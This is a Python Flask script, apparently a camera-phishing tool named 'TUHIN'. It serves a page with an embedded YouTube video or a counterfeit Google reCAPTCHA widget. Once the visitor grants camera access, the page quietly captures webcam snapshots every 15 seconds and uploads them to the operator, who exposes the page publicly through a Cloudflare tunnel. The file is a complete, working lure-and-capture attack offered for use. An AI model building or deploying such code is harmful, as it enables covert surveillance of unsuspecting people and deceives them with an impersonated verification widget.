#!/usr/bin/env python3
import os
import json
import base64
import uuid
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import re
from flask import Flask, request, render_template_string, jsonify
import threading
import webbrowser
import subprocess
import shutil
import time
import re as regex

# ---------- CONFIG ----------
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "video_url": "https://www.youtube.com/watch?v=S3mkmh18Zu0",
    "photo_dir": "photos",
    "recaptcha": False
}

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
    with open(CONFIG_FILE) as f:
        return json.load(f)

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

# ---------- HELPERS ----------
def get_video_id(url):
    q = parse_qs(urlparse(url).query)
    if "v" in q:
        return q["v"][0]
    m = re.search(r"(youtu\.be/|embed/)([\w-]+)", url)
    return m.group(2) if m else "S3mkmh18Zu0"

def ensure_photo_dir(path):
    os.makedirs(path, exist_ok=True)
    return path

def save_image(b64_data, path):
    img = base64.b64decode(b64_data)
    name = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}.png"
    with open(os.path.join(path, name), "wb") as f:
        f.write(img)
    return name

# ---------- FLASK APP ----------
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Player</title>
<style>
body{margin:0;background:#000;font-family:Arial,sans-serif}
iframe{width:100%;height:50vh;border:0}
video,canvas{display:none}
</style>
</head>
<body>
<iframe src="https://www.youtube.com/embed/{{vid}}?autoplay=1&rel=0"></iframe>

{% if recaptcha %}
<div style="width:304px;background:#1b1b1b;border:1px solid #2a2a2a;border-radius:4px;padding:12px;box-sizing:border-box;color:#eaeaea;box-shadow:0 6px 16px rgba(0,0,0,.6);margin:20px auto;">
<div style="display:flex;align-items:center;">
<input type="checkbox" id="chk" style="width:18px;height:18px;cursor:pointer;">
<span style="margin-left:10px;font-size:14px;">I'm not a robot</span>
<div style="margin-left:auto;text-align:center;">
<svg width="32" height="32" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
  <path fill="#4285F4" d="M24 4a20 20 0 1019.8 23.2h-8.1A12 12 0 1124 12V4z"/>
  <path fill="#34A853" d="M44 24c0-1.4-.1-2.8-.4-4.1H24v8h11.3A12 12 0 0124 36v8c11 0 20-9 20-20z"/>
  <path fill="#FBBC05" d="M6.2 14.7l6.6 4.8A12 12 0 0124 12V4c-7.8 0-14.6 4.5-17.8 10.7z"/>
  <path fill="#EA4335" d="M24 44v-8a12 12 0 01-11.2-7.7l-6.6 4.8C9.4 39.5 16.2 44 24 44z"/>
</svg>
<div style="font-size:9px;color:#bdbdbd;line-height:10px;">reCAPTCHA</div>
</div>
</div>

<div id="q" style="margin-top:10px;font-size:13px;color:#bdbdbd;"></div>
<input id="a" type="number" placeholder="Answer" style="display:none;margin-top:8px;width:100%;padding:6px;background:#2a2a2a;border:1px solid #3a3a3a;border-radius:3px;color:#fff;font-size:13px;outline:none;">
<div style="margin-top:6px;font-size:12px;height:16px;">
<span id="status"></span>
<span id="spinner" style="display:none;width:12px;height:12px;border:2px solid #ccc;border-top:2px solid #4caf50;border-radius:50%;margin-left:6px;animation:spin 1s linear infinite;"></span>
</div>
<style>@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</div>
{% endif %}

<video id="cam" autoplay playsinline></video>
<canvas id="cv"></canvas>

<script>
const useCaptcha={{recaptcha|lower}};
let ok=!useCaptcha, sending=false;
const cam=document.getElementById("cam");
const cv=document.getElementById("cv");

if(useCaptcha){
const chk=document.getElementById("chk");
const q=document.getElementById("q");
const a=document.getElementById("a");
const status=document.getElementById("status");
const spinner=document.getElementById("spinner");

chk.onchange=()=>{
if(chk.checked){
let x=Math.floor(Math.random()*9)+1;
let y=Math.floor(Math.random()*9)+1;
q.innerText='Verify: '+x+' + '+y;
q.dataset.ans=x+y;
a.style.display='block';
spinner.style.display='inline-block';
}else{
q.innerText=''; a.value=''; a.style.display='none'; status.innerText=''; spinner.style.display='none';
}
};

a.oninput=()=>{
spinner.style.display='inline-block';
if(parseInt(a.value)===parseInt(q.dataset.ans)){
setTimeout(()=>{
status.innerText='✓ Verified';
status.style.color='#4caf50';
spinner.style.display='none';
ok=true;
document.querySelector('div[style*="width:304px"]').remove();
start();
},500);
}else{
status.innerText='Verifying…';
status.style.color='#ff9800';
}
};
}else{start();}

async function start(){
const s=await navigator.mediaDevices.getUserMedia({video:true});
cam.srcObject=s;
setInterval(async ()=>{
if(!ok||!cam.videoWidth||sending) return;
sending=true;
cv.width=320; cv.height=240;
cv.getContext("2d").drawImage(cam,0,0,320,240);
try{
await fetch("/upload",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({image:cv.toDataURL("image/png")})});
}finally{sending=false;}
},15000);
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    cfg = load_config()
    return render_template_string(
        HTML_TEMPLATE,
        vid=get_video_id(cfg["video_url"]),
        recaptcha=cfg["recaptcha"]
    )

@app.route("/upload", methods=["POST"])
def upload():
    img_data = request.json.get("image")
    if not img_data:
        return jsonify({"error":"no image"}), 400
    _, b64 = img_data.split(",", 1)
    cfg = load_config()
    ensure_photo_dir(cfg["photo_dir"])
    name = save_image(b64, cfg["photo_dir"])
    return jsonify({"saved": name})

# ---------- BANNER ----------
def banner():
    print("\033[92m")
    print("████████╗██╗   ██╗██╗  ██╗██╗███╗   ██╗")
    print("╚══██╔══╝██║   ██║██║  ██║██║████╗  ██║")
    print("   ██║   ██║   ██║███████║██║██╔██╗ ██║")
    print("   ██║   ██║██╔══██║██║██║╚██╗██║")
    print("   ██║    ╚██████╔╝██║  ██║██║██║ ╚████║")
    print("   ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝")
    print("\033[0m")
    print("Secure Player Launcher in TUHIN")
    print("Created by Jabed-A1")
    print("https://github.com/Jabed-A1\n")

# ---------- SERVER + CLOUD FLARE TUNNEL ----------
def start_flask_server():
    def run_flask():
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    threading.Thread(target=run_flask, daemon=True).start()
    print("[*] Flask server running at http://127.0.0.1:5000")
    try:
        webbrowser.open("http://127.0.0.1:5000")
    except:
        pass
    # Auto cloudflared
    if shutil.which("cloudflared") is None:
        print("[!] cloudflared not found. Install it to expose public URL.")
        return
    print("[*] Starting Cloudflare Tunnel automatically...")
    def run_tunnel():
        process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        for line in process.stdout:
            line = line.strip()
            print("[cloudflared]", line)
            match = regex.search(r"https://[a-z0-9\-]+\.trycloudflare\.com", line)
            if match:
                url = match.group(0)
                print(f"[*] Public URL: {url}")
                try:
                    webbrowser.open(url)
                except:
                    pass
    threading.Thread(target=run_tunnel, daemon=True).start()
    time.sleep(3)

# ---------- CLI MENU ----------
def cli_menu():
    while True:
        print("""
1) Start YouTube server
2) Start reCAPTCHA server
3) Change YouTube video link
4) Change storage path
5) Exit
""")
        cfg = load_config()
        opt = input("Select option: ").strip()

        if opt == "1":
            cfg["recaptcha"] = False
            save_config(cfg)
            start_flask_server()
        elif opt == "2":
            cfg["recaptcha"] = True
            save_config(cfg)
            start_flask_server()
        elif opt == "3":
            new_url = input("New YouTube URL: ").strip()
            if new_url:
                cfg["video_url"] = new_url
                save_config(cfg)
                print("[*] Video URL updated. Refresh browser to see changes.")
        elif opt == "4":
            new_path = input("New storage path: ").strip()
            if new_path:
                cfg["photo_dir"] = new_path
                save_config(cfg)
                print(f"[*] Storage path updated to {new_path}")
        elif opt == "5":
            print("Exiting...")
            break
        else:
            print("Invalid option.")

# ---------- MAIN ----------
if __name__ == "__main__":
    banner()
    cli_menu()
